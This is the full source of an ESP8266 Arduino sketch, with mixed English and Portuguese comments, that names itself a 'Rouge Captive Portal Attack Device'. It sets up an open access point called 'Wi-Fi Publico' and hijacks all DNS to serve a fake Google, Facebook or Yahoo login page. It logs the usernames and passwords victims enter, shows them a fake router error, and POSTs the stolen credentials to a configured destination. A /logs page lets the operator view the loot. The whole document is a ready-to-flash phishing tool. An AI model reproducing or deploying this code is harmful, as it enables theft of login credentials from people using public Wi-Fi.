#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include "google.h"
#include "facebook.h"
#include "yahoo.h"

#define LOGFILE "/log.txt"
#define DESTINATION_IP "192.168.4.1"  // Alterado para o próprio endereço IP local do ESP8266
#define DESTINATION_PORT 80
#define DESTINATION_PATH "/logs"

/*
 *************************
 * ACCESS POINT SSID
 * ***********************
 */
const char *ssid = "Wi-Fi Publico";

/*
 *************************
 * LOGIN CAPTURE PAGE
 * ***********************
 */
 // Can be Google, Facebook or Yahoo
#define captivePortalPage GOOGLE_HTML
 // GOOGLE_HTML, FACEBOOK_HTML, YAHOO_HTML

// Basic configuration using common network setups (usual DNS port, IP and web server port)
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
IPAddress netMsk(255, 255, 255, 0);
DNSServer dnsServer;
ESP8266WebServer webServer(80);

// Buffer strings
String webString = "";
String serialString = "";

// Function prototypes
void sendDataToServer(String data);

// Blink the builtin LED n times
void blink(int n)
{
  for (int i = 0; i < n; i++)
  {
    digitalWrite(LED_BUILTIN, LOW);
    delay(250);
    digitalWrite(LED_BUILTIN, HIGH);
    delay(250);
  }
}

void setup()
{
  //Start Serial communication
  Serial.begin(9600);
  Serial.println();
  Serial.println("V2.0.0 - Rouge Captive Portal Attack Device");
  Serial.println();

  // LED setup
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);

  // Initialize file system (SPIFFS) and read the log file, if not present create a new one
  Serial.print("Initializing File System (First time can take around 90 seconds)...");
  SPIFFS.begin();
  Serial.println(" Success!");
  Serial.print("Checking for log.txt file...");
  // this opens the file "log.txt" in read-mode
  File f = SPIFFS.open(LOGFILE, "r");

  if (!f)
  {
    Serial.print(" File doesn't exist yet. \nFormatting and creating it...");
    SPIFFS.format();
    // open the file in write mode
    File f = SPIFFS.open(LOGFILE, "w");
    if (!f)
    {
      Serial.println("File creation failed!");
    }
    f.println("Captured Login Credentials:");
  }
  f.close();
  Serial.println(" Success!");

  // Create Access Point
  Serial.print("Creating Access Point...");
  WiFi.setOutputPower(20.5); // max output power
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, netMsk);
  WiFi.softAP(ssid);
  delay(500);
  Serial.println(" Success!");

  // Iniciar servidor DNS
  Serial.print("Starting DNS Server...");
  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(" Success!");

  // Verifique o nome de domínio e atualize a página
  webServer.on("/", handleRoot);
  webServer.on("/generate_204", handleRoot); //Portal cativo Android. Talvez não seja necessário. Pode ser tratado pelo manipulador notFound.
  webServer.on("/fwlink", handleRoot);      //Portal cativo da Microsoft. Talvez não seja necessário. Pode ser tratado pelo manipulador notFound.
  webServer.onNotFound(handleRoot);

  // Valide e salve combinações USER/PASS
  webServer.on("/validate", []()
                {
                  // armazenar credenciais coletadas
                  String url = webServer.arg("url");
                  String user = webServer.arg("user");
                  String pass = webServer.arg("pass");

                  // Enviando dados para Serial (DEBUG)
                  serialString = user + ":" + pass;
                  Serial.println(serialString);

                  // Anexar dados ao arquivo de log , salvar os logs 
                  File f = SPIFFS.open(LOGFILE, "a");
                  f.print(url);
                  f.print(":");
                  f.print(user);
                  f.print(":");
                  f.println(pass);
                  f.close();

                  // Envie uma resposta de erro ao usuário após a coleta de credenciais
                  webString = "<h1>#E701 - Router Configuration Error</h1>";
                  webServer.send(500, "text/html", webString);

                  // Redefinir strings de buffer
                  serialString = "";
                  webString = "";

                  blink(5);

                  // Envie dados para o destino especificado
                  String dataToSend = url + ":" + user + ":" + pass;
                  sendDataToServer(dataToSend);
                });

  // Página de registro 
  webServer.on("/logs", []()
                {
                  webString = "<html><body><h1>Captured Logs</h1><br><pre>";
                  File f = SPIFFS.open(LOGFILE, "r");
                  serialString = f.readString();
                  webString += serialString;
                  f.close();
                  webString += "</pre><br><a href='/logs/clear'>Clear all logs</a></body></html>";
                  webServer.send(200, "text/html", webString);
                  Serial.println(serialString);
                  serialString = "";
                  webString = "";
                });

  // Clear all logs
  webServer.on("/logs/clear", []()
                {
                  webString = "<html><body><h1>All logs cleared</h1><br><a href=\"/esportal\"><- BACK TO INDEX</a></body></html>";
                  File f = SPIFFS.open(LOGFILE, "w");
                  f.println("Captured Login Credentials:");
                  f.close();
                  webServer.send(200, "text/html", webString);
                  Serial.println(serialString);
                  serialString = "";
                  webString = "";
                });

  // Iniciar servidor web
  Serial.print("Starting Web Server...");
  webServer.begin();
  Serial.println(" Success!");

  blink(10);
  Serial.println("Device Ready!");
}

void loop()
{
  dnsServer.processNextRequest();
  webServer.handleClient();
}

void handleRoot()
{
  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
  webServer.sendHeader("Pragma", "no-cache");
  webServer.sendHeader("Expires", "-1");

  webServer.send(200, "text/html", captivePortalPage);
}

void sendDataToServer(String data)
{
  WiFiClient client;
  if (client.connect(DESTINATION_IP, DESTINATION_PORT))
  {
    // Make a HTTP POST request
    client.println("POST " + String(DESTINATION_PATH) + " HTTP/1.1");
    client.println("Host: " + String(DESTINATION_IP));
    client.println("Content-Type: application/x-www-form-urlencoded");
   client.print("Content-Length: ");
    client.println(data.length());
    client.println();
    client.println(data);

    Serial.println("Data sent to server: " + data);

    // Wait for a response from the server
    while (client.connected())
    {
      if (client.available())
      {
        String line = client.readStringUntil('\r');
        Serial.println(line);
      }
    }
    client.stop();
  }
  else
  {
    Serial.println("Failed to connect to server");
  }
}
